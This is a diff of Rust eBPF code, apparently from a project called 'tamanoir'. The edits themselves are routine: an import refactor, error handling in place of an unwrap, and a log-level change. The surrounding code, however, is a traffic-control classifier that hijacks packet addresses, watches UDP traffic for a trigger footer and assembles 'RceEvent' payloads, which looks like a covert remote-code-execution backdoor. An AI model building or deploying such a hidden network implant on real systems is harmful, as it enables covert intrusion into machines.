@@ -13,10 +13,11 @@ use network_types::{
     ip::{IpProto, Ipv4Hdr},
     udp::UdpHdr,
 };
+use tamanoir_common::{ContinuationByte, RceEvent};
 
 use crate::common::{
-    load_bytes, update_addr, update_ip_hdr_tot_len, update_udp_hdr_len, ContinuationByte, RceEvent,
-    UpdateType, HIJACK_IP, IP_SRC_ADDR_OFFSET, RBUF, TARGET_IP, UDP_CSUM_OFFSET, UDP_OFFSET,
+    load_bytes, update_addr, update_ip_hdr_tot_len, update_udp_hdr_len, UpdateType, HIJACK_IP,
+    IP_SRC_ADDR_OFFSET, RBUF, TARGET_IP, UDP_CSUM_OFFSET, UDP_OFFSET,
 };
 
 #[classifier]
@@ -75,7 +76,7 @@ fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
                 let footer = &footer[..FOOTER_LEN];
 
                 let last_bytes_rtcp_trigger: [u8; FOOTER_TXT.len()] =
-                    FOOTER_TXT.as_bytes().try_into().unwrap();
+                    FOOTER_TXT.as_bytes().try_into().map_err(|_| 0)?;
 
                 if footer[..FOOTER_TXT.len()] == last_bytes_rtcp_trigger {
                     debug!(ctx, " !! TRIGGER MOTHERFUCKER !! ");
@@ -110,7 +111,7 @@ fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
                         consumed += batch.len();
                         let is_first = idx == 0;
                         let is_last = consumed >= payload_sz;
-                        info!(ctx, "{} bytes consumed", consumed);
+                        debug!(ctx, "{} bytes consumed", consumed);
                         submit(RceEvent {
                             prog: payload_buf[..PAYLOAD_BATCH_LEN].try_into().map_err(|_| 0)?,
                             event_type: continuation_byte.clone(),
